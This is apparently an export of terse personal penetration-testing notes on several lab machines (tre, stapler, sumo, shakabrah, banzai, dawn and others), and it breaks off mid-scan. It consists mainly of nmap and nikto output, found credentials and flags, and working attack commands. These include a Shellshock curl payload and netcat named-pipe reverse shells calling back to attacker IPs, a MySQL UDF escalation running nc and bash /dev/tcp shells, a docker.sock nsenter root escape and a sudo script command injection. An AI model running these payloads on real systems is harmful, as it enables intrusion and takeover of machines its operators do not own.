Rcvd: 42 (3.302KB)<br /><br /><br /><br /><a href="http://192.168.225.95/robots.txt">http://192.168.225.95/robots.txt</a><br /><br />view-source:<a href="http://192.168.225.95/pwned.vuln/">http://192.168.225.95/pwned.vuln/</a><br /><br />ftpuser<br />B0ss_Pr!ncesS<br />id_rsa<br /><br />ssh as ariana<br /><br />sudo -u selena /home/message.sh<br /><br />===============================<br />#!/bin/bash<br /><br />clear<br />echo &quot;Welcome to linux.messenger &quot;<br />                echo &quot;&quot;<br />users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)<br />                echo &quot;&quot;<br />echo &quot;$users&quot;<br />                echo &quot;&quot;<br />read -p &quot;Enter username to send message : &quot; name <br />                echo &quot;&quot;<br />read -p &quot;Enter message for $name :&quot; msg<br />                echo &quot;&quot;<br /><strong><span style="background-color:#ff0000;">echo &quot;Sending message to $name &quot;<br /><br />$msg 2&gt; /dev/null</span></strong><br /><br />                echo &quot;&quot;<br />echo &quot;Message sent to $name :) &quot;<br />                echo &quot;&quot;<br />================================<br /><br /><br />to selena<br />/bin/bash<br /><br /><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets">https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets</a><br />docker image ls<br />selena@pwned:~$ docker image ls<br />REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE<br />privesc             latest              09ae39f0f8fc        14 months ago       88.3MB<br />&lt;none&gt;              &lt;none&gt;              e13ad046d435        14 months ago       88.3MB<br /><span style="color:#000000;background-color:#a020f0;">alpine</span>              latest              a24bb4013296        15 months ago       5.57MB<br />debian              wheezy              10fcec6d95c4        2 years ago         88.3MB<br /><br /><br />docker -H unix:///var/run/docker.sock run -it --privileged --pid=host <span style="background-color:#a020f0;">alpine</span> nsenter -t 1 -m -u -n -i sh<br /><br /><br />e52234255fb296ceed9c4c100f956d1f</div><div class='page'><h1 class='title level-2'>tre.pg</h1><br/><br />─# nmap -sV -sC   192.168.250.84  -p-                                                                                        <br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-09-19 14:30 +03                                                               <br />Stats: 0:11:42 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan                                               <br />SYN Stealth Scan Timing: About 73.50% done; ETC: 14:46 (0:04:13 remaining)                                                    <br />Nmap scan report for 192.168.250.84                                                                                           <br />Host is up (0.14s latency).                                                                                                   <br />Not shown: 65532 closed ports                                                                                                 <br />PORT     STATE SERVICE VERSION                                                                                                <br />22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                                         <br />| ssh-hostkey:                                                                                                                <br />|   2048 99:1a:ea:d7:d7:b3:48:80:9f:88:82:2a:14:eb:5f:0e (RSA)                                                                <br />|   256 f4:f6:9c:db:cf:d4:df:6a:91:0a:81:05:de:fa:8d:f8 (ECDSA)                                                               <br />|_  256 ed:b9:a9:d7:2d:00:f8:1b:d3:99:d6:02:e5:ad:17:9f (ED25519)                                                             <br />80/tcp   open  http    Apache httpd 2.4.38 ((Debian))                                                                         <br />|_http-server-header: Apache/2.4.38 (Debian)                                                                                  <br />|_http-title: Tre                                                                                                             <br />8082/tcp open  http    nginx 1.14.2                                                                                           <br />|_http-server-header: nginx/1.14.2                                                                                            <br />|_http-title: Tre                                                                                                             <br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                       <br />                                                                                                                              <br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .                                <br />Nmap done: 1 IP address (1 host up) scanned in 979.85 seconds         <br /><br /><br /><br /><br />└─# nikto -h 192.168.250.84       <br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.250.84<br />+ Target Hostname:    192.168.250.84<br />+ Target Port:        80<br />+ Start Time:         2021-09-19 15:08:01 (GMT3)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.38 (Debian)<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Server may leak inodes via ETags, header found with file /, inode: a4, size: 5a56bc0e14dfe, mtime: gzip<br />+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS <br /><span style="color:#ffff00;">+ Default account found for &#39;Restricted Content&#39; at /system/ (ID &#39;admin&#39;, PW &#39;admin&#39;). Generic account discovered..</span><br />+ /info.php: Output from the phpinfo() function was found.<br />+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ OSVDB-5292: /info.php?file=<a href="http://cirt.net/rfiinc.txt?:">http://cirt.net/rfiinc.txt?:</a> RFI from RSnake&#39;s list (<a href="http://ha.ckers.org/weird/rfi-locations.dat">http://ha.ckers.org/weird/rfi-locations.dat</a>) or from <a href="http://osvdb.org/">http://osvdb.org/</a><br />+ X-XSS-Protection header has been set to disable XSS Protection. There is unlikely to be a good reason for this.<br />+ 7941 requests: 0 error(s) and 11 item(s) reported on remote host<br />+ End Time:           2021-09-19 15:28:47 (GMT3) (1246 seconds)<br />---------------------------------------------------------------------------<br /><br /><a href="https://www.exploit-db.com/exploits/48818">https://www.exploit-db.com/exploits/48818</a><br /><br /><code>url = &#39;http://&#39; + self.RHOST + &quot;:&quot; + self.RPORT + self.mantisLoc + &#39;/verify.php?id=&#39; + self.verify_user_id + &#39;&amp;confirm_hash=&#39;</code><br /><br /><a href="http://192.168.250.84/system/verify.php?id=1&confirm_hash=">http://192.168.250.84/system/verify.php?id=1&amp;confirm_hash=</a><br /><br /><br /><a href="https://www.mantisbt.org/bugs/view.php?id=26091">https://www.mantisbt.org/bugs/view.php?id=26091</a><br /><br /><br /></div><div class='page'><h1 class='title level-2'>HAwordy.pg</h1><br/>192.168.250.23<br /><br /><br />/usr/share/cups/banners/topsecret         <br />/usr/share/cups/banners/secret                  <br />/usr/share/cups/data/secret.pdf<br />/usr/share/cups/data/topsecret.pdf<br /><br />LFILE=/bin/bash<br />./cp --attributes-only --preserve=all ./cp &quot;$LFILE&quot;</div><div class='page'><h1 class='title level-2'>stapler.pg</h1><br/>PORT      STATE SERVICE     REASON         VERSION                                                                                                                                                                                                            <br />21/tcp    open  ftp         syn-ack ttl 63 vsftpd 2.0.8 or later                                                                                                                                                                                              <br />| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />|_Can&#39;t get directory listing: PASV failed: 550 Permission denied.<br />| ftp-syst:                                                    <br />|   STAT:                                                      <br />| FTP server status:                                           <br />|      Connected to 192.168.49.232<br />|      Logged in as ftp                                        <br />|      TYPE: ASCII                                             <br />|      No session bandwidth limit<br />|      Session timeout in seconds is 300<br />|      Control connection is plain text<br />|      Data connections will be plain text<br />|      At session startup, client count was 5<br />|      vsFTPd 3.0.3 - secure, fast, stable<br />|_End of status                                                <br />22/tcp    open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey:                                                 <br />|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)<br />| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc/xrBbi5hixT2B19dQilbbrCaRllRyNhtJcOzE8x0BM1ow9I80RcU7DtajyqiXXEwHRavQdO+/cHZMyOiMFZG59OCuIouLRNoVO58C91gzDgDZ1fKH6BDg+FaSz+iYZbHg2lzaMPbRje6oqNamPR4QGISNUpxZeAsQTLIiPcRlb5agwurovTd3p0SXe0GknFhZwHHvAZWa2J6lHE2b9K5<br />IsSsDzX2WHQ4vPb+1DzDHV0RTRVUGviFvUX1X5tVFvVZy0TTFc0minD75CYClxLrgc+wFLPcAmE2C030ER/Z+9umbhuhCnLkLN87hlzDSRDPwUjWr+sNA3+7vc/xuZul<br />|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA) <br />| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNQB5n5kAZPIyHb9lVx1aU0fyOXMPUblpmB8DRjnP8tVIafLIWh54wmTFVd3nCMr1n5IRWiFeX1weTBDSjjz0IY=<br />|   256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)<br />|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ9wvrF4tkFMApswOmWKpTymFjkaiIoie4QD0RWOYnny<br />53/tcp    open  tcpwrapped  syn-ack ttl 63<br />80/tcp    open  http        syn-ack ttl 63 PHP cli server 5.5 or later<br />| http-methods:                                                <br />|_  Supported Methods: GET HEAD POST OPTIONS<br />|_http-title: 404 Not Found                                    <br />139/tcp   open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)<br />3306/tcp  open  mysql       syn-ack ttl 63 MySQL 5.7.12-0ubuntu1<br />| mysql-info:                                                  <br />|   Protocol: 10                                               <br />|   Version: 5.7.12-0ubuntu1                                   <br />|   Thread ID: 19                                              <br />|   Capabilities flags: 63487                                  <br />|   Some Capabilities: SupportsTransactions, Support41Auth, Speaks41ProtocolOld, InteractiveClient, SupportsCompression, LongColumnFlag, IgnoreSigpipes, LongPassword, SupportsLoadDataLocal, ODBCClient, IgnoreSpaceBeforeParenthesis, FoundRows, Speaks41Pro<br />tocolNew, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults<br />|   Status: Autocommit                                         <br />|   Salt: GZn\x1F\x7F\x1D7Jc\x11O%-@&lt;@%0uK<br />|_  Auth Plugin Name: mysql_native_password<br />12380/tcp open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))<br />| http-methods:                                                <br />|_  Supported Methods: GET HEAD POST OPTIONS<br />|_http-server-header: Apache/2.4.18 (Ubuntu)<br />|_http-title: Tim, we need to-do better next year for Initech<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />port 666 message2.jpg<br /><br />file message2.jpg<br />unzip message2.zip ⇒ message2.jpg<br />exiftool<br />If you are reading this, you should get a cookie! <br /><br />smbmap -H 192.168.232.148 -R -P 139<br /><br /><br />└─# nikto -h 192.168.232.148:12380                                                                                             │===============================================================<br />- Nikto v2.1.6                                                                                                                 │2021/09/18 19:46:10 Finished<br />---------------------------------------------------------------------------                                                    │===============================================================<br />+ Target IP:          192.168.232.148                                                                                          │                                                                                                                              <br />+ Target Hostname:    192.168.232.148                                                                                          │┌──(root💀kali)-[/home/kali]<br />+ Target Port:        12380                                                                                                    │└─# <br />---------------------------------------------------------------------------                                                    │<br />+ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU│<br />=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost                                       │<br />                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384                                                                       │<br />                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU│<br />=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost                                       │<br />+ Start Time:         2021-09-18 19:42:11 (GMT3)                                                                               │<br />---------------------------------------------------------------------------                                                    │<br />+ Server: Apache/2.4.18 (Ubuntu)                                                                                               │<br />+ The anti-clickjacking X-Frame-Options header is not present.                                                                 │<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS      │<br />+ Uncommon header &#39;dave&#39; found, with contents: Soemthing doesn&#39;t look right here                                               │<br />+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.                                              │<br />+ The site uses SSL and Expect-CT header is not present.                                                                       │<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a differen│<br />t fashion to the MIME type                                                                                                     │<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)                                                     │<br />+ Entry &#39;/admin112233/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)                                     │<br />+ Entry &#39;/blogblog/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)                                        │<br />+ &quot;robots.txt&quot; contains 2 entries which should be manually viewed.                                                             │<br />                 <br /><br />│[+] Performing password attack on Xmlrpc Multicall against 11 user/s<br />│Progress Time: 00:00:08 &lt;=====================================================================&gt; (4 / 4) 100.00% Time: 00:00:08<br />│WARNING: Your progress bar is currently at 4 out of 4 and cannot be incremented. In v2.0.0 this will become a ProgressBar::Inv<br />│alidProgressError.<br />│Progress Time: 00:00:10 &lt;=====================================================================&gt; (4 / 4) 100.00% Time: 00:00:10<br />│[SUCCESS] - garry / football                                                                                                  <br />  [SUCCESS] - harry / monkey                <br /><br /><a href="https://192.168.250.148:12380/blogblog/wp-content/plugins/">https://192.168.250.148:12380/blogblog/wp-content/plugins/</a><br /><br /><a href="https://192.168.250.148:12380/blogblog/wp-content/plugins/">https://192.168.250.148:12380/blogblog/wp-content/</a>uploads<br /><br /><a href="https://www.exploit-db.com/exploits/39646">https://www.exploit-db.com/exploits/39646</a><br /><br /><a href="https://192.168.250.148:12380/blogblog/?p-470">https://192.168.250.148:12380/blogblog/?p-470</a><br /><br />mysq<br />root:plbkac<br /><br /><br />┌──(root💀kali)-[/home/kali/stapler]<br />└─# cat john.txt                                                                                                                                                                                                                                          1 ⚙<br />john:$P$B7889EMq/erHIuZapMB8GEizebcIy9.<br />                                                                                                                                                                                                                                                              <br />┌──(root💀kali)-[/home/kali/stapler]<br />└─# john --wordlist=/usr/share/wordlists/rockyou.txt john.txt                                                                                                                                                                                             1 ⚙<br />Using default input encoding: UTF-8<br />Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])<br />Cost 1 (iteration count) is 8192 for all loaded hashes<br />Will run 4 OpenMP threads<br />Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status<br />incorrect        (john)<br /><br />upload plugin as zip<br /><br />go to wp-content/uploads<br /><br />root <br /><a href="https://www.exploit-db.com/exploits/39772">https://www.exploit-db.com/exploits/39772</a><br /><br />READ WALKTHROUGH IT FROM PLAYGROUND</div><div class='page'><h1 class='title level-2'>sunsetdecoy.pg</h1><br/>──(root💀kali)-[/home/kali]<br />└─# nmap -A -p- 192.168.80.85  <br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-29 19:54 +03<br />Stats: 0:16:44 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute<br />Traceroute Timing: About 32.26% done; ETC: 20:11 (0:00:00 remaining)<br />Nmap scan report for 192.168.80.85<br />Host is up (0.15s latency).<br />Not shown: 65533 closed ports<br />PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 a9:b5:3e:3b:e3:74:e4:ff:b6:d5:9f:f1:81:e7:a4:4f (RSA)<br />|   256 ce:f3:b3:e7:0e:90:e2:64:ac:8d:87:0f:15:88:aa:5f (ECDSA)<br />|_  256 66:a9:80:91:f3:d8:4b:0a:69:b0:00:22:9f:3c:4c:5a (ED25519)<br />80/tcp open  http    Apache httpd 2.4.38<br />| http-ls: Volume /<br />| SIZE  TIME              FILENAME<br />| 3.0K  2020-07-07 16:36  save.zip<br />|_<br />|_http-server-header: Apache/2.4.38 (Debian)<br />|_http-title: Index of /<br />No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).<br />TCP/IP fingerprint:<br />OS:SCAN(V=7.91%E=4%D=5/29%OT=22%CT=1%CU=41270%PV=Y%DS=2%DC=T%G=Y%TM=60B275B<br />OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10F%TI=Z%TS=A)OPS(O1=M506ST<br />OS:11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M5<br />OS:06ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%<br />OS:T=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)<br />OS:T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=<br />OS:N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G<br />OS:)IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Network Distance: 2 hops<br />Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE (using port 1720/tcp)<br />HOP RTT       ADDRESS<br />1   147.68 ms 192.168.49.1<br />2   147.62 ms 192.168.80.85<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 1009.82 seconds<br /><br /><br /><br /><br />scan.zip<br /><br />296640a3b825115a47b68fc44501c828<br />server<br /><br /><br /><br /><br />ssh 296640a3b825115a47b68fc44501c828@192.168.80.85 -t &quot;sh&quot;<br />password:server<br /><br /><br /><br />ssh -L 10000:127.0.0.1:631 -f -N 296640a3b825115a47b68fc44501c828@192.168.80.85 -t &quot;sh&quot;<br /><br /><br />honeypot.decoy av option runs privileged as root<br /><br /><br /><br />chkroot exploit runs /tmp/update as root<br />/tmp/update file<br /><br /><br /><br />a7673b90016e05a7f0d1228cc187e2b1</div><div class='page'><h1 class='title level-2'>sumo.pg</h1><br/>└─# nmap -sS -T5 192.168.176.87<br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-06-02 00:18 +03<br />Nmap scan report for 192.168.176.87<br />Host is up (0.15s latency).<br />Not shown: 998 closed ports<br />PORT   STATE SERVICE<br />22/tcp open  ssh<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 4.61 seconds<br /><br /><br />└─# nikto -h <a href="http://192.168.176.87/">http://192.168.176.87/</a><br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.176.87<br />+ Target Hostname:    192.168.176.87<br />+ Target Port:        80<br />+ Start Time:         2021-06-02 00:26:13 (GMT3)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.2.22 (Ubuntu)<br />+ Server may leak inodes via ETags, header found with file /, inode: 1706318, size: 177, mtime: Mon May 11 20:55:10 2020<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Uncommon header &#39;tcn&#39; found, with contents: list<br />+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See <a href="http://www.wisec.it/sectou.php?id=4698ebdc59d15.">http://www.wisec.it/sectou.php?id=4698ebdc59d15.</a> The following alternatives for &#39;index&#39; were found: index.html<br />+ Uncommon header &#39;93e4r0-cve-2014-6271&#39; found, with contents: true<br />+ OSVDB-112004: /cgi-bin/test: Site appears vulnerable to the &#39;shellshock&#39; vulnerability (<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278</a>).<br />+ Uncommon header &#39;93e4r0-cve-2014-6278&#39; found, with contents: true<br />+ OSVDB-112004: /cgi-bin/test.sh: Site appears vulnerable to the &#39;shellshock&#39; vulnerability (<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271</a>).<br />+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD <br />+ OSVDB-3092: /cgi-bin/test/test.cgi: This might be interesting...<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ 8725 requests: 0 error(s) and 14 item(s) reported on remote host<br />+ End Time:           2021-06-02 00:48:18 (GMT3) (1325 seconds)<br /><br /><br /><br /><strong>reverse shell</strong><br />curl -H &#39;User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/192.168.49.176/6666 0&gt;&amp;1&#39; <a href="http://192.168.176.87/cgi-bin/test/test.cgi">http://192.168.176.87/cgi-bin/test/test.cgi</a><br />nc -nvlp 6666<br /><br /><a href="https://www.exploit-db.com/exploits/26131">https://www.exploit-db.com/exploits/26131</a><br /><br /><code>PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/x86_64-linux-gnu/;export PATH</code><br /><br />wget <a href="http://192.168.49.176/33589.c">http://192.168.49.176/</a>perf<br /><br />PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/x86_64-linux-gnu/;export PATH<br /><br /><code>LD_LIBRARY_PATH</code>=/usr/lib/x86_64-linux-gnu/;export <code>LD_LIBRARY_PATH</code><br />gcc -pthread perf.c -o perf<br /><br />./hack 0<br /><br /><br />192.168.142.87<br />curl -H &#39;User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/192.168.49.142/6666 0&gt;&amp;1&#39; <a href="http://192.168.176.87/cgi-bin/test/test.cgi">http://192.168.176.87/cgi-bin/test/test.cgi</a></div><div class='page'><h1 class='title level-2'>shakabrah.pg</h1><br/>e010e7b2fd47a8562ba9f00e97826b70<br /><br /><br />cd /tmp;mknod mypipe p;/bin/bash 0&lt; /tmp/mypipe | nc 192.168.49.211 6666 1&gt; /tmp/mypipe<br /><br /><br />cd /tmp;mknod mypipe2 p;/bin/bash 0&lt; /tmp/mypipe2 | nc -nlvp 4444 1&gt; /tmp/mypipe2</div><div class='page'><h1 class='title level-2'>banzai.pg</h1><br/><br /><br /><br /><br /><br /><br />ftp download all files recursively (mirror)<br />wget -m <a href="ftp://admin:admin@192.168.55.56">ftp://admin:admin@192.168.55.56</a> --no-passive-ftp<br /><br />8295 http server<br /><br />upload shell<br /><br />view-source:<a href="http://banzai.offseclabs.com:8295/simple.php?cmd=cd%20..;cat%20config.php">http://banzai.offseclabs.com:8295/simple.php?cmd=cd%20..;cat%20config.php</a><br /><br />&lt;?php<br />define(&#39;DBHOST&#39;, &#39;127.0.0.1&#39;);<br />define(&#39;DBUSER&#39;, &#39;root&#39;);<br />define(&#39;DBPASS&#39;, &#39;EscalateRaftHubris123&#39;);<br />define(&#39;DBNAME&#39;, &#39;main&#39;);<br />?&gt;<br /><br />ONLY PORT 22 OPEN OUTBOUND<br />nc -e /bin/sh 192.168.49.55 22<br /><br /><br />ps aux | grep mysql<br />root       696  0.0  9.3 1139684 192908 ?      Sl   07:10   0:02 /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid<br /><br /><br />The first step in this process is to discover where this installation of MySQL stores its UDFs. In this case, the directory is <strong>/usr/lib/mysql/plugin/</strong>. We&#39;ll use this directory name in the steps that follow.<br /><code>mysql&gt; show variables like &#39;plugin_dir&#39;;</code><br /><br /><br />We must also determine whether the database has been misconfigured to allow insecure handling of files.<br /><code>mysql&gt; SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code><br /><br /><br /><span style="color:#071ba3;">MYSQL PRIV ESC </span><strong><span style="color:#071ba3;">Linux</span></strong><br />The  steps are very similar for Linux. We need to download the UDF binary  first. We are going to use the 64 bit UDF library for this example. You  can download it <a href="https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64">here</a>. For 32 bit machines, you can download the library <a href="https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/32">here</a>.<br />The file should be called <strong>lib_mysqludf_sys.so</strong> and we need to copy it to the target location. This could be in a user folder or the <strong>/tmp/</strong>  directory. We will then be issuing commands to load the file into a new  row, dump the contents of that row to a new file, create a new function  to point to the new file, then execute the function to get a reverse  shell as <strong>root</strong>.<br />mysql&gt; use mysql;mysql&gt; create table potato(line blob);mysql&gt; insert into potato values(load_file(&#39;/tmp/lib_mysqludf_sys.so&#39;));mysql&gt; select * from potato into dumpfile &#39;/usr/lib/lib_mysqludf_sys.so&#39;;mysql&gt; create function sys_exec returns integer soname &#39;lib_mysqludf_sys.so&#39;;mysql&gt; select sys_exec(&#39;bash -i &gt;&amp; /dev/tcp/192.168.1.99/443 0&gt;&amp;1&#39;);<br /><br /><br />create table whiskey(line blob);<br /><br />insert into whiskey values(load_file(&#39;/var/www/html/lib_mysqludf_sys_64.so&#39;));<br /><br />select * from whiskey into dumpfile &#39;/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so&#39;;<br /><br />create function sys_exec returns integer soname &#39;lib_mysqludf_sys_64.so&#39;;<br /><br />select sys_exec(&#39;nc -e /bin/sh 192.168.49.130 22&#39;);<br /><br /><br />FOR ERROR:<br /><br />ERROR 1126 (HY000): Can&#39;t open shared library &#39;lib_mysqludf_sys_64.so&#39; (errno: 0 /usr/lib/mysql/plugin/lib_mysqludf_sys_64.so: file too short)<br /><br />system cp /var/www/html/lib_mysqludf_sys_64.so /usr/lib/mysql/plugin/lib_mysqludf_sys_64.so<br /><br />then<br />create function sys_exec returns integer soname &#39;lib_mysqludf_sys_64.so&#39;;<br />select sys_exec(&#39;nc -e /bin/sh 192.168.49.55 22&#39;);</div><div class='page'><h1 class='title level-2'>dawn.pg</h1><br/><br />└─# nmap -A -p- 192.168.221.11    <br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-28 00:07 +03<br />Not shown: 65531 closed ports<br />PORT     STATE SERVICE     VERSION<br />80/tcp   open  http        Apache httpd 2.4.38 ((Debian))<br />|_http-server-header: Apache/2.4.38 (Debian)<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br />445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)<br />3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1<br />| mysql-info: <br />|   Protocol: 10<br />|   Version: 5.5.5-10.3.15-MariaDB-1<br />|   Thread ID: 15<br />|   Capabilities flags: 63486<br />|   Some Capabilities: InteractiveClient, SupportsLoadDataLocal, LongColumnFlag, Speaks41ProtocolOld, SupportsCompression, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, FoundRows, Speaks41ProtocolNew, SupportsTransactions, IgnoreSigpipes, ODBCClient, Support41Auth, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins<br />|   Status: Autocommit<br />|   Salt: :309m9sW&lt;efQA2w$GyLN<br />|_  Auth Plugin Name: mysql_native_password<br />No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).<br />TCP/IP fingerprint:<br />OS:SCAN(V=7.91%E=4%D=5/28%OT=80%CT=1%CU=36725%PV=Y%DS=2%DC=T%G=Y%TM=60B00DA<br />OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%TS=A)OPS(O1=M506ST<br />OS:11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M5<br />OS:06ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%<br />OS:T=40%W=7210%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)<br />OS:T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=<br />OS:N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G<br />OS:)IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Network Distance: 2 hops<br />Service Info: Host: DAWN<br /><br />Host script results:<br />|_clock-skew: mean: 1h20m01s, deviation: 2h18m35s, median: 0s<br />|_nbstat: NetBIOS name: DAWN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br />| smb-os-discovery: <br />|   OS: Windows 6.1 (Samba 4.9.5-Debian)<br />|   Computer name: dawn<br />|   NetBIOS computer name: DAWN\x00<br />|   Domain name: dawn<br />|   FQDN: dawn.dawn<br />|_  System time: 2021-05-27T17:22:46-04:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2021-05-27T21:22:46<br />|_  start_date: N/A<br /><br />TRACEROUTE (using port 993/tcp)<br />HOP RTT       ADDRESS<br />1   139.74 ms 192.168.49.1<br />2   148.38 ms 192.168.221.11<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 